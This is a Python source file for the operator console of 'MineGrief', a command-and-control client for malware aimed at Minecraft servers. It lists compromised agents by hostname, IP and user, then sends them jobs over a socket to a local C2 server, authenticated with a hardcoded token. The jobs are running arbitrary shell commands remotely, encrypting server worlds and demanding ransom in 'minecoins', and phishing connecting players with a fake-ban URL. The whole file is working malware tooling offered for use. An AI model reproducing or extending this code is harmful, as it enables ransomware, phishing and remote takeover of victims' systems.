import socket
import sys
import base64
import time
import json

from InquirerPy import inquirer 
from prompt_toolkit.completion import Completer, Completion 
from tabulate import tabulate


banner = '''🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬛️⬛️⬛️⬛️⬛️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬛️⬛️⬛️⬛️⬛️⬜️
⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬛️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️
⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬛️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️
⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬛️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️
⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️⬛️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
  __  __ _             _____      _       __ 
 |  \\/  (_)           / ____|    (_)     / _|
 | \\  / |_ _ __   ___| |  __ _ __ _  ___| |_ 
 | |\\/| | | '_ \\ / _ \\ | |_ | '__| |/ _ \\  _|
 | |  | | | | | |  __/ |__| | |  | |  __/ |  
 |_|  |_|_|_| |_|\\___|\\_____|_|  |_|\\___|_|
 
 Current MineGrief version: v0.0.1
 Made by @_chebuya with 🖤'''

token = "h4i5gdVuvxR5Y5oL5lxi"

agent_commands = {
    "help": "Display help menu",
    "exit": "Exit minegrief client",
    "encrypt": "encrypt <target directory> (encrypt worlds in the target directory and demand minecoins)",
    "phish": "phish <target directory> <phish url> (phish connecting players with a URL and fake ban)",
    "shell": "shell <command> (run a shell command)",
}

commands = {
    "help": "Display help menu",
    "exit": "Exit minegrief client",
    "list agents": "Lists minegrief agents",
    "use": "use <id> (enters interactive mode for an agent)",
}


class TextCompleter(Completer):
    def __init__(self, commands):
        self.commands = commands

    def get_completions(self, document, complete_event):
        word = document.current_line_before_cursor
        for name in list(self.commands):
            if word in name or word in name.lower():
                yield Completion(name, start_position=-len(word), display_meta=self.commands[name])


def use_agent(uuid):
    while True:
        source = inquirer.text( 
            vi_mode=True, 
            message=f'minegrief {uuid}> ', 
            completer=TextCompleter(agent_commands)
        ).execute()


        if "exit" in source:
             break
        elif "help" in source:
            for command, desc in agent_commands.items():
                print(f"{command:30s}{desc}")
        elif "shell" in source:
            command = base64.b64encode(source.lstrip("shell ").encode()).decode()
            job_id = send_job(uuid, "execute", command)['job_id']
            while True: 
                job_data = get_job(uuid, job_id)
                status = job_data['status']

                if status == "pending":
                    time.sleep(1)
                    continue

                print(base64.b64decode(job_data['output']).decode())
                break;
        elif "encrypt" in source:
            command = base64.b64encode(source.lstrip("encrypt ").encode()).decode()
            send_job(uuid, "encrypt", command)
        elif "phish" in source:
            directory = base64.b64encode(source.split(" ")[1].encode()).decode()
            url = base64.b64encode(source.split(" ")[2].encode()).decode()
            send_job(uuid, "phish", f"{directory}|{url}")


def list_agents():
    data = '{' + \
            '"action":"list_agents",' + \
            f'"token":"{token}"' + \
            '}'

    response = send_data(data)

    agents = [[agent['uuid'], agent['hostname'], agent['ip'], agent['user']] for agent in json.loads(base64.b64decode(response['args']))]
    print(tabulate(agents, headers=['id', 'Hostname', "IP", "User"]))

def get_job(uuid, job_id):
    data = '{' + \
            '"action":"get_job",' + \
            f'"token":"{token}",' + \
            f'"client_id":"{uuid}",' + \
            f'"job_id":"{job_id}"' + \
            '}'

    return send_data(data)


def send_job(uuid, action, args):
    data = '{' + \
            '"action":"add_job",' + \
            f'"token":"{token}",' + \
            f'"client_id":"{uuid}",' + \
            f'"job_action":"{action}",' + \
            f'"job_args":"{args}"' + \
            '}'

    return send_data(data)

def send_data(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.connect(('127.0.0.1', 1338))

        message = (data + '\n').encode()

        s.sendall(message)

        response = b''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk

        try:
            decoded_response = response.decode('utf-8').strip()
            cleaned_response = decoded_response.strip('{}')
            response_map = {}
            if cleaned_response:
                pairs = cleaned_response.split(',')
                for pair in pairs:
                    key_value = pair.split(':')
                    key = key_value[0].strip('"')
                    value = key_value[1].strip('"')
                    response_map[key] = value
            return response_map

        except Exception as e:
            return {"error": f"Failed to process response: {str(e)}", 
                    "raw_response": decoded_response}

    except socket.error as e:
        return {"error": f"Socket error: {str(e)}"}
    finally:
        s.close()


if __name__ == '__main__':
    print(banner)
    while True:
        source = inquirer.text( 
            vi_mode=True, 
            message='minegrief> ', 
            completer=TextCompleter(commands)
        ).execute()


        if "exit" in source:
             break
        elif "help" in source:
            for command, desc in commands.items():
                print(f"{command:30s}{desc}")
        elif "list agents" in source:
            list_agents()
        elif "use " in source:
            use_agent(source.split(" ")[1])
